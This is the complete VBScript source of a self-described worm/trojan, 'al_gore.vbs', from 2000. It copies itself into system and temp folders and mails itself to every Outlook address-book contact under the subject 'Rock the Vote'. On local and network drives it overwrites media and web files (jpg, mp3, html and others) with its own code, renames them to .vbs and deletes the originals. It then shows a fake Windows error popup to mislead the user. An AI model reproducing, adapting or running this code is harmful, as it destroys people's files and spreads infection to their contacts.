' File: al_gore.vbs
' Version: 1.01
' Release Date: 9/28/00
' Author: Butt3rKup

' Comments: Potentially very aggressive worm/trojan.  Use with caution.
' Compatability: Win 98/NT/2000  (Win95 if IE5.x installed)

On Error Resume Next

Dim wsh,fso,file,win,sys,tmp,trojan,drive,vcopy
Const WinFolder = 0
Const SysFolder = 1
Const TmpFolder = 2
Const FixedDrive = 2
Const NetDrive = 3
Const olMailItem = 0
Set wsh = CreateObject("Wscript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullName,1)
Set sys = fso.GetSpecialFolder(SysFolder)
Set tmp = fso.GetSpecialFolder(TmpFolder)
Set trojan = fso.GetFile(WScript.ScriptFullName)
Set drive = fso.Drives
vcopy = file.ReadAll

main()

sub main
	trojan.Copy(sys & "\System32.vbs")
	trojan.Copy(tmp & "\al_gore.vbs")
	spam()
	get_folders()
	wsh.Popup "Windows does not recognize this file. " & VbCrLf & "Click 'OK' to cancel this operation.",,"Windows"
end sub

sub spam
	Dim mailer,mapi,lists,abook,x,adrlist,user,email
	Set mailer = WScript.CreateObject("Outlook.Application")
	Set mapi = mailer.GetNameSpace("MAPI")
		For lists = 1 To mapi.AddressLists.Count
			Set abook = mapi.AddressLists(lists)
			x = 1
				For adrlist = 1 To abook.AddressEntries.Count
				user = abook.AddressEntries(x)
				Set email = mailer.CreateItem(olMailItem)
				With email
					.Recipients.Add(user)
					.Subject = "Rock the Vote"
					.Body = VbCrLf & "I thought you would find this interesting :)" & VbCrLf & VbCrLf
					.Attachments.Add(tmp & "\al_gore.vbs")
					.Send
				End With
				x = x + 1
				Next
		Next
	Set mailer = Nothing
	Set mapi = Nothing
end sub

sub get_folders
	Dim t,folder,sfolder,ffile
	For Each t In drive
		If (t.DriveType = FixedDrive) Or (t.DriveType = NetDrive) Then
			Set folder = fso.GetFolder(t.path & "\")
			Set sfolder = folder.SubFolders
				For Each ffile in sfolder
					replicate(ffile.path)
				Next
		End If
	Next
end sub

sub replicate(folderinfo)
	Dim fldr,fls,ft,ext,otf,cp
	Set fldr = fso.GetFolder(folderinfo)
	Set fls = fldr.Files
		For Each ft In fls
			ext = fso.GetExtensionName(ft.Path)
				If (ext = "asp") Or (ext = "jpg") Or (ext = "gif") Or (ext = "htm") Or (ext = "html") Or (ext = "css") Or (ext = "mp3") Or (ext = "mp2") Or (ext = "mod") Or (ext = "mpeg") Or (ext = "mpg") Then
					Set otf = fso.OpenTextFile(ft.Path,2,True)
					otf.Write vcopy
					otf.Close
					Set cp = fso.GetFile(ft.Path)
					cp.Copy(ft.Path & ".vbs")
					fso.DeleteFile(ft.Path)
				End If
		Next
end sub